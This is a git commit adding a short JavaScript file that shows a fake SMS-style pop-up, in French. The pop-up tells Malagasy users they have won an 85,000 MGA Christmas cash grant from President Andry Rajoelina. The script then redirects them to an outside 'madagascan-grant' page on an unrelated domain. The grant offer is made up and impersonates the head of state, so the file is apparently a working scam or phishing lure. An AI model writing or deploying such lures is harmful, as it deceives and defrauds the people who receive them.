c7209ae6c34caf59d12a2fcbe676635bfc52b2b9
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-11-27 23:02:10 -0800

    Create mada-active.js

---
+++ mada-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER 85 000MGA'
+password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de 85 000MGA du Président ANDRY RAJOELINA pour les MALGACHE. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETIRER 85 000MGA');
+if (password != 'RETIRER 85 000MGA') {
+location.href='https://all-free-byt.org/madagascan-grant.html';
+}
